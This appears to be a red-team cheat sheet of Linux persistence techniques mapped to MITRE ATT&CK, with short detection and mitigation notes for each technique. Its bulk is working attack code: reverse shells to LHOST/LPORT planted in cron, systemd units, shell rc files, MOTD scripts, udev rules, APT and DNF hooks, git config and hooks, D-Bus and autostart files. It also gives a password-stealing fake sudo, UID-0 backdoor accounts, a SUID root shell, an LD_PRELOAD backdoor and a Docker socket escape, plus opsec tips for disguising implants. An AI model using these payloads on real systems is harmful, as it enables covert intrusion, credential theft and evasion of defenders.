
# Linux Persistence Techniques (2026)

> **Intended Audience:** Red Team / Offensive Security practitioners.
> MITRE ATT&CK references are included throughout. Detection and mitigation notes are provided for each technique to support purple team exercises.

---

## Table of Contents

- [Methodology Overview](#methodology-overview)
- [1. Reverse Shells](#1-reverse-shells)
- [2. Credential & Account Persistence](#2-credential--account-persistence)
- [3. SUID Binary Abuse](#3-suid-binary-abuse)
- [4. Scheduled Tasks](#4-scheduled-tasks)
- [5. Shell Initialization Backdoors](#5-shell-initialization-backdoors)
- [6. Startup & Service Persistence](#6-startup--service-persistence)
- [7. Message of the Day (MOTD)](#7-message-of-the-day-motd)
- [8. Hardware Event Triggers](#8-hardware-event-triggers)
- [9. Package Manager Abuse](#9-package-manager-abuse)
- [10. SSH Persistence](#10-ssh-persistence)
- [11. Git Backdoors](#11-git-backdoors)
- [12. Modern Techniques (2024+)](#12-modern-techniques-2024)
- [Detection Reference Summary](#detection-reference-summary)
- [References](#references)

---

## Methodology Overview

When establishing persistence on a Linux target, consider the following decision tree:

```
Do you have root?
├── YES → Prefer system-level persistence (systemd, udev, APT, drivers)
│         Use kernel/eBPF techniques for stealth
└── NO  → Use user-level persistence (cron, git hooks, shell rc, autostart)
          Consider LD_PRELOAD or SUID if misconfigured binaries exist

Persistence trigger type?
├── Time-based     → cron, systemd timers, at
├── Event-based    → udev rules, git hooks, PAM modules, D-Bus
├── Login-based    → .bashrc, .zshrc, MOTD, PAM
└── Network-based  → SSH keys, port knocking, reverse shells on boot
```

**Opsec Considerations (always):**
- Suppress all stdout/stderr from backdoor commands (`>/dev/null 2>&1`)
- Use `nohup` or `disown` to detach processes from the shell session
- Avoid writing to `/tmp` where possible — prefer `/var/tmp`, `/dev/shm`, or living-off-the-land paths
- Mimic legitimate file/service names to blend in
- Clean up compiler artifacts, history entries, and temp files after use

---

## 1. Reverse Shells

**MITRE:** [T1059.004](https://attack.mitre.org/techniques/T1059/004/) — Command and Scripting Interpreter: Unix Shell

### Modern Listener Setup

Prefer `ncat` (from nmap) or `pwncat-cs` over legacy `netcat`. `pwncat` provides automated post-exploitation and persistence helpers.

```bash
# Basic ncat listeners
ncat --tcp -lvp 4242
ncat --udp -lvp 4242
ncat --sctp -lvp 4242

# pwncat-cs (recommended for interactive sessions)
pip install pwncat-cs
pwncat-cs -lp 4242
```

### Reverse Shell One-Liners (2026)

Prefer shells that don't rely on `-e` (which is often disabled in distro-packaged netcat):

```bash
# Bash (most reliable)
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'

# Python3 (pty upgrade built-in)
python3 -c '
import socket,subprocess,os,pty
s=socket.socket()
s.connect(("LHOST",LPORT))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn("/bin/bash")
'

# Socat (fully interactive, preferred)
socat TCP:LHOST:LPORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Rust-based (ncat replacement, more opsec-friendly)
# https://github.com/robiot/rustcat
rc -lp 4242
```

### TTY Upgrade (post-connection)

Always upgrade your shell immediately after connecting:

```bash
# On the victim
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
# Then in the shell:
export TERM=xterm-256color
stty rows 38 cols 116
```

**Detection:** Outbound connections to uncommon ports, `/dev/tcp` usage in bash, processes with stdio redirected to sockets.

**Mitigation:** Egress firewall rules, auditd rules on socket creation, restrict `/dev/tcp` via bash compile flags.

---

## 2. Credential & Account Persistence

**MITRE:** [T1136.001](https://attack.mitre.org/techniques/T1136/001/) — Create Account: Local Account

### Add a Backdoor Root User

```bash
# Add user with UID/GID 0 (root-equivalent)
useradd -ou 0 -g 0 -s /bin/bash -d /root backdoor_user
echo "backdoor_user:$(openssl passwd -6 'yourpassword')" | chpasswd -e

# Or directly edit /etc/passwd and /etc/shadow
echo 'svc_monitor:x:0:0::/root:/bin/bash' >> /etc/passwd
echo "svc_monitor:$(openssl passwd -6 'yourpassword'):19000:0:99999:7:::" >> /etc/shadow
```

> **Opsec:** Name the account something that blends in with service accounts on the target (e.g., `svc_<something>`, `_<daemon>`). UID 0 accounts are detectable — prefer sudo rule abuse instead where possible.

### Sudo Rule Abuse (stealthier)

```bash
# Grant NOPASSWD sudo to an existing low-priv account
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/99-policy-exempt

# Or scope it to a specific binary for less visibility
echo 'www-data ALL=(ALL) NOPASSWD: /usr/bin/python3' >> /etc/sudoers.d/99-policy-exempt
```

### Credential Harvesting via Fake sudo (updated)

```bash
# fakesudo script — drop in ~/.local/bin/sudo or a PATH-prepended dir
cat << 'EOF' > ~/.local/bin/sudo
#!/bin/bash
read -rsp "[sudo] password for $USER: " sudopass
echo ""
printf '%s\t%s\t%s\n' "$(date -u +%FT%TZ)" "$USER" "$sudopass" >> /dev/shm/.ds_store
sleep 2
echo "Sorry, try again."
exec /usr/bin/sudo "$@"
EOF
chmod +x ~/.local/bin/sudo

# Prepend to PATH via .bashrc
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
```

**Detection:** New UID 0 accounts, unexpected `/etc/sudoers.d/` entries, PATH prepend in shell rc files, duplicate `sudo` binaries.

**Mitigation:** Monitor `/etc/passwd`, `/etc/shadow`, `/etc/sudoers*` with auditd or a FIM tool (e.g., AIDE, Wazuh).

---

## 3. SUID Binary Abuse

**MITRE:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) — Abuse Elevation Control Mechanism: Setuid and Setgid

### Drop a SUID Shell

```bash
# Compile and plant a SUID root shell
cat << 'EOF' > /tmp/.build.c
#include <unistd.h>
int main(void) {
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    execl("/bin/bash", "bash", NULL);
}
EOF

gcc /tmp/.build.c -o /usr/lib/systemd/.gc-helper 2>/dev/null
rm /tmp/.build.c
chown root:root /usr/lib/systemd/.gc-helper
chmod 4755 /usr/lib/systemd/.gc-helper
```

Invoke later as any user:

```bash
/usr/lib/systemd/.gc-helper
```

> **Opsec:** Place in a directory that already contains legitimate binaries. Avoid `/var/tmp` — it's commonly checked. Use dotfile names to avoid casual `ls` visibility.

**Detection:** `find / -perm -4000` scans, auditd `chmod`/`chown` events, new SUID files outside of expected paths.

**Mitigation:** Mount `/tmp`, `/var/tmp`, `/dev/shm` with `nosuid`. Regularly audit SUID binaries with a baseline.

---

## 4. Scheduled Tasks

**MITRE:** [T1053.003](https://attack.mitre.org/techniques/T1053/003/) — Scheduled Task/Job: Cron

### Cron Persistence

```bash
# User crontab (no root needed)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1") | crontab -

# On reboot (with jitter to avoid timing signatures)
(crontab -l 2>/dev/null; echo "@reboot sleep $((RANDOM % 120)) && bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1") | crontab -

# System-level (requires root) — blend in with legit cron files
echo '*/10 * * * * root /usr/lib/systemd/.gc-helper >/dev/null 2>&1' > /etc/cron.d/0apt-compat
```

### Systemd Timers (preferred over cron)

Systemd timers are more flexible, harder to spot with standard cron auditing, and survive reboots reliably.

```ini
# /etc/systemd/system/syslog-fwd.service
[Unit]
Description=Syslog Forwarding Helper

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
StandardOutput=null
StandardError=null
```

```ini
# /etc/systemd/system/syslog-fwd.timer
[Unit]
Description=Syslog Forwarding Timer

[Timer]
OnBootSec=3min
OnUnitActiveSec=10min
Unit=syslog-fwd.service

[Install]
WantedBy=timers.target
```

```bash
systemctl daemon-reload
systemctl enable --now syslog-fwd.timer
```

**Detection:** `crontab -l`, `/etc/cron.*` inspection, `systemctl list-timers --all`, auditd on crontab writes.

**Mitigation:** Restrict cron to authorized users via `/etc/cron.allow`. Monitor systemd unit file creation.

---

## 5. Shell Initialization Backdoors

**MITRE:** [T1546.004](https://attack.mitre.org/techniques/T1546/004/) — Event Triggered Execution: .bash_profile and .bashrc

### .bashrc / .zshrc / .profile

```bash
# Append a silent reverse shell trigger to all common rc files
PAYLOAD='(bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" >/dev/null 2>&1 &)'

for rcfile in ~/.bashrc ~/.zshrc ~/.bash_profile ~/.profile; do
    [ -f "$rcfile" ] && echo "$PAYLOAD" >> "$rcfile"
done
```

> **Opsec:** Wrap the payload in a conditional so it only fires once per session and produces no output. Consider adding it after a long block of legitimate-looking shell customization to make it harder to spot visually.

### Environment Variable Hijack via .bashrc

```bash
# Silently prepend attacker-controlled bin dir to PATH
echo 'export PATH="$HOME/.local/share/systemd:$PATH"' >> ~/.bashrc
# Drop malicious binaries (e.g., fake sudo, git, python) in that dir
```

**Detection:** Hash/content monitoring of rc files, auditd `open` events on `~/.bashrc`, `~/.zshrc`.

**Mitigation:** FIM on user home directories, periodic rc file audits, restrict shell rc modification via policy.

---

## 6. Startup & Service Persistence

**MITRE:** [T1543.002](https://attack.mitre.org/techniques/T1543/002/) — Create or Modify System Process: Systemd Service

### Systemd Service (root)

```ini
# /etc/systemd/system/dbus-srv-helper.service
[Unit]
Description=D-Bus Service Helper
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable --now dbus-srv-helper.service
```

### Systemd User Service (no root needed)

```bash
mkdir -p ~/.config/systemd/user/

cat << 'EOF' > ~/.config/systemd/user/pipewire-restore.service
[Unit]
Description=PipeWire Session Restore

[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable --now pipewire-restore.service
loginctl enable-linger $USER  # persist across logouts
```

### Network Interface Up Hook (legacy)

```bash
# /etc/network/if-up.d/ scripts run as root on interface up
cat << 'EOF' > /etc/network/if-up.d/wpasupplicant-helper
#!/bin/sh
nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1 &
EOF
chmod +x /etc/network/if-up.d/wpasupplicant-helper
```

**Detection:** `systemctl list-units --type=service`, inspect `/etc/systemd/system/` and `~/.config/systemd/user/` for unexpected units, `loginctl` linger status.

**Mitigation:** Audit systemd unit directories, restrict `systemctl enable` via policy, monitor `if-up.d` scripts.

---

## 7. Message of the Day (MOTD)

**MITRE:** [T1546](https://attack.mitre.org/techniques/T1546/) — Event Triggered Execution

MOTD scripts in `/etc/update-motd.d/` run as root on SSH login.

```bash
# Append to an existing MOTD script (less suspicious than a new file)
echo 'nohup bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" >/dev/null 2>&1 &' \
    >> /etc/update-motd.d/00-header
```

> **Opsec:** Adding to an existing file is stealthier than creating a new one. Keep the MOTD output intact so SSH logins look normal.

**Detection:** Hash monitoring of `/etc/update-motd.d/`, auditd write events on those files.

**Mitigation:** Set MOTD scripts immutable (`chattr +i`), or disable dynamic MOTD entirely.

---

## 8. Hardware Event Triggers

**MITRE:** [T1546](https://attack.mitre.org/techniques/T1546/) — Event Triggered Execution

### udev Rules (USB trigger)

Fires when a USB device is connected. Useful for physical access scenarios.

```bash
cat << 'EOF' > /etc/udev/rules.d/73-usb-suspend.rules
ACTION=="add", ENV{DEVTYPE}=="usb_device", SUBSYSTEM=="usb", \
RUN+="/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"
EOF

udevadm control --reload-rules
```

> **Opsec:** Name the rules file to mimic legitimate udev rules (e.g., `73-usb-suspend.rules`, `60-net.rules`).

**Detection:** Audit `/etc/udev/rules.d/` for unexpected `RUN+=` entries, especially those invoking shells.

**Mitigation:** FIM on udev rules directories, restrict write access to `/etc/udev/rules.d/`.

---

## 9. Package Manager Abuse

**MITRE:** [T1554](https://attack.mitre.org/techniques/T1554/) — Compromise Client Software Binary

### APT Hook

Executes on every `apt-get update` (runs as root):

```bash
echo 'APT::Update::Pre-Invoke {"nohup bash -c \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\" >/dev/null 2>&1 &"};' \
    > /etc/apt/apt.conf.d/00logging-compat
```

### DNF/YUM Plugin (RHEL/Fedora)

```bash
# Drop a malicious dnf plugin
cat << 'EOF' > /usr/lib/python3/dist-packages/dnf-plugins/syshealth.py
import dnf

class SysHealth(dnf.Plugin):
    name = 'syshealth'
    def resolved(self):
        import subprocess
        subprocess.Popen(
            ['bash','-c','bash -i >& /dev/tcp/LHOST/LPORT 0>&1'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
EOF
```

**Detection:** Audit `/etc/apt/apt.conf.d/`, `/etc/dnf/plugins/`, and package manager plugin directories. Monitor for unexpected network connections immediately following package manager invocations.

**Mitigation:** FIM on package manager config directories, restrict write access.

---

## 10. SSH Persistence

**MITRE:** [T1098.004](https://attack.mitre.org/techniques/T1098/004/) — Account Manipulation: SSH Authorized Keys

### Authorized Keys

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Generate a dedicated keypair (on attacker machine)
ssh-keygen -t ed25519 -C "" -f ./implant_key -N ""

# Add public key to target
echo "ssh-ed25519 AAAA...yourpubkey..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

> **Opsec:** Use `ed25519` keys (shorter, faster, less conspicuous than RSA 4096). Add a comment-free key (`-C ""`) to reduce fingerprinting.

### SSH Config Hijack

```bash
# If you can write to sshd_config, add an authorized keys path that you control
echo 'AuthorizedKeysFile /etc/ssh/.authorized_fragments/%u' >> /etc/ssh/sshd_config
mkdir -p /etc/ssh/.authorized_fragments/
echo "ssh-ed25519 AAAA...yourpubkey..." > /etc/ssh/.authorized_fragments/root
systemctl reload sshd
```

### PAM Backdoor (advanced, root required)

A malicious PAM module can allow authentication with a hardcoded master password regardless of the actual user password:

```bash
# Compile a minimal PAM backdoor module
# (reference: https://github.com/zephrax/linux-pam-backdoor)
# Install to /lib/security/ and reference in /etc/pam.d/sshd
```

> This is a significant opsec risk — PAM errors can lock all users out. Test carefully in lab.

**Detection:** Monitor `~/.ssh/authorized_keys` changes, unexpected entries in `sshd_config`, new files in PAM directories.

**Mitigation:** FIM on SSH config and authorized_keys files, use `AuthorizedKeysCommand` to centralize key management, disable password auth.

---

## 11. Git Backdoors

**MITRE:** [T1546](https://attack.mitre.org/techniques/T1546/) — Event Triggered Execution

Effective for persisting in developer environments without root. Triggers on normal developer workflows.

### Git Config Variables

```properties
# ~/.gitconfig — user-level, affects all repos

[core]
    # Triggers on: git commit --amend, git rebase -i
    editor = nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-vim}}

    # Triggers on: git log, git diff, git show
    pager = nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1 & ${PAGER:-less}

    # Triggers on: git fetch, git pull, git push (to SSH remotes)
    sshCommand = nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1 & ssh

[ssh]
    # Required to prevent sshCommand from running twice
    variant = ssh

    # Global hooks dir — backdoors ALL repos for this user
    hooksPath = ~/.config/git/hooks
```

### Git Hooks

```bash
# Set global hooks path
git config --global core.hooksPath ~/.config/git/hooks
mkdir -p ~/.config/git/hooks

# pre-commit: fires on every git commit
cat << 'EOF' > ~/.config/git/hooks/pre-commit
#!/bin/sh
nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1 &
EOF

# post-checkout: fires on git checkout, git clone
cat << 'EOF' > ~/.config/git/hooks/post-checkout
#!/bin/sh
nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >/dev/null 2>&1 &
EOF

chmod +x ~/.config/git/hooks/*
```

> **Opsec:** Global hooks will silently break any repo-level hooks. Consider copying existing hooks and appending the payload rather than replacing them.

**Detection:** Inspect `~/.gitconfig` for unexpected `editor`, `pager`, `sshCommand`, `hooksPath` values. Audit `.git/hooks/` in sensitive repositories.

**Mitigation:** Enforce allowed git config values via policy, use `safe.directory` and signed commits, audit `~/.gitconfig` regularly.

---

## 12. Modern Techniques (2024+)

### eBPF-Based Persistence

eBPF programs can hook kernel functions and intercept/manipulate system calls with minimal footprint. Requires root (or `CAP_BPF`).

- **Tooling:** [TripleCross](https://github.com/h3xduck/TripleCross) — eBPF rootkit demonstrating persistence, reverse shell, and execution hijacking
- **Technique:** Hook `sys_execve` to intercept process execution and inject backdoor behavior
- **Stealth:** Does not require writing to disk in the traditional sense; difficult to detect with standard tools

> eBPF-based implants are largely invisible to `ps`, `netstat`, `ls`, and standard auditd unless eBPF-aware security tooling (e.g., Falco, Tetragon) is deployed.

### D-Bus Activation Persistence

```bash
# Drop a D-Bus service activation file
cat << 'EOF' > ~/.local/share/dbus-1/services/org.freedesktop.NetworkManager.Helper.service
[D-BUS Service]
Name=org.freedesktop.NetworkManager.Helper
Exec=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
EOF
```

Triggers when any process sends a message to the registered D-Bus name. More passive and event-driven than cron.

### Container Escape + Host Persistence

If running inside a container with a mounted Docker socket or privileged mode:

```bash
# Mount host filesystem via Docker socket
curl -s --unix-socket /var/run/docker.sock \
    -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt crontab -l"],"Binds":["/:/mnt"],"Privileged":true}'
```

### LD_PRELOAD Hijack

**MITRE:** [T1574.006](https://attack.mitre.org/techniques/T1574/006/) — Hijack Execution Flow: LD_PRELOAD

```c
// preload_backdoor.c
// Hooks into any dynamically linked binary
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

__attribute__((constructor))
void init() {
    // Fire payload when any linked binary loads this library
    if (fork() == 0) {
        execl("/bin/bash", "bash", "-c",
            "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
            NULL);
    }
}
```

```bash
gcc -shared -fPIC -nostartfiles preload_backdoor.c -o /usr/lib/x86_64-linux-gnu/libsystemd-util.so.1
echo '/usr/lib/x86_64-linux-gnu/libsystemd-util.so.1' >> /etc/ld.so.preload
```

> `/etc/ld.so.preload` applies globally to all dynamically linked processes — extremely powerful but very noisy.

### XDG Autostart (Desktop Environments)

```ini
# ~/.config/autostart/xdg-user-dirs-update.desktop
[Desktop Entry]
Type=Application
Name=XDG User Directories
Exec=bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
```

Triggers on GUI login (GNOME, KDE, XFCE). No root required.

---

## Detection Reference Summary

| Technique | Key Detection Points | Recommended Tooling |
|---|---|---|
| Reverse Shells | Outbound connections, `/dev/tcp` in bash, stdio→socket | auditd, Falco, Zeek |
| Account Creation | `/etc/passwd` changes, UID 0 accounts | auditd, AIDE, Wazuh |
| SUID Binaries | New SUID files, `chmod`/`chown` events | auditd, `find -perm -4000` baseline |
| Cron / Timers | Crontab writes, new systemd units | auditd, `systemctl list-timers` |
| Shell RC Files | `~/.bashrc`, `~/.zshrc` modifications | FIM (AIDE, Wazuh) |
| Systemd Services | New `.service` files, `enable` events | `systemctl list-units`, auditd |
| MOTD | `/etc/update-motd.d/` modifications | FIM, auditd |
| udev Rules | New `RUN+=` entries in rules files | FIM, auditd |
| APT/DNF Hooks | Config files in `apt.conf.d/`, plugin dirs | FIM, package manager logs |
| SSH Keys | `authorized_keys` changes, new `sshd_config` entries | FIM, auditd |
| Git Backdoors | `~/.gitconfig` `editor`/`pager`/`hooksPath`, hook scripts | Manual audit, FIM |
| eBPF | `bpf()` syscall, loaded programs | Falco, Tetragon, `bpftool prog list` |
| LD_PRELOAD | `/etc/ld.so.preload` changes, unexpected `.so` files | auditd, FIM |

---

## References

- [MITRE ATT&CK - Linux Persistence](https://attack.mitre.org/tactics/TA0003/)
- [PayloadsAllTheThings - Linux Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)
- [TripleCross eBPF Rootkit](https://github.com/h3xduck/TripleCross)
- [pwncat-cs](https://github.com/calebstewart/pwncat)
- [HackTricks - Linux Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#persistence)
- [Falco - Runtime Security](https://falco.org/)
- [Tetragon - eBPF Security Observability](https://tetragon.io/)
- [linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS / LOLDrivers](https://lolbas-project.github.io/)

---

> **Reminder:** All techniques in this document are for use only in authorized penetration testing and red team engagements. Unauthorized use is illegal.

## Additional Persistence Options

* [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)
* [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554)
* [Create Account](https://attack.mitre.org/techniques/T1136/)
* [Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)
* [Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)
* [Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/)
* [Event Triggered Execution: Trap](https://attack.mitre.org/techniques/T1546/005/) 
* [Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
* [Event Triggered Execution: .bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [External Remote Services](https://attack.mitre.org/techniques/T1133/)
* [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
* [Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [Pre-OS Boot](https://attack.mitre.org/techniques/T1542/)
* [Pre-OS Boot: Bootkit](https://attack.mitre.org/techniques/T1542/003/)
* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) 
* [Scheduled Task/Job: At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
* [Server Software Component](https://attack.mitre.org/techniques/T1505/)
* [Server Software Component: SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)
* [Server Software Component: Transport Agent](https://attack.mitre.org/techniques/T1505/002/) 
* [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) 
* [Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
* [Traffic Signaling: Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
* [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/) 
* [Valid Accounts: Domain Accounts 2](https://attack.mitre.org/techniques/T1078/002/)

## References

* [@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289](https://twitter.com/RandoriSec/status/1036622487990284289)
* [https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
* [Pouki from JDI](#no_source_code)
